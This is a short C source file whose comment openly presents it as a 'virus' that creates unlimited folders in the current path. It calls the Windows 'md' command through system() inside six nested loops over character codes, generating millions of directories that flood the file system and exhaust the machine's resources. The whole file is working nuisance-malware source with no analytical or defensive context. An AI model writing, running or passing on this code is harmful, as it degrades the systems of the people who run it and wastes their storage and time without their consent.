#include<stdlib.h>

//This virus when executed will create unlimited folder in current path of the machine

void main(){
    char s[14]="md "; int man,i,j,k,l,m,n;
    for(man=1;man<=10;man++){
        for(i=65;i<122;i++){
            s[3]=i;
            s[4]=0;
            if(man==1){
                system(s);
                continue;
            }

            for(j=65;j<122;j++){
                s[4]=j;
                s[5]=0;
                if(man==2){
                    system(s);
                    continue;
                }

                for(k=65;k<122;k++){
                    s[5]=k;
                    s[6]=0;
                    if(man==3){
                        system(s);
                        continue;
                    }
                    for(l=65;l<122;l++){
                        s[6]=l;
                        s[7]=0;
                        if(man==4){
                            system(s);
                            continue;
                        }
                        for(m=65;m<122;m++){
                            s[7]=m;
                            s[8]=0;
                            if(man==5){
                            system(s);
                            continue;
                            }
                            for(n=65;n<122;n++){
                                s[8]=n;
                                s[9]=0;
                                if(man==6)
                                {
                                    system(s);
                                    continue;
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
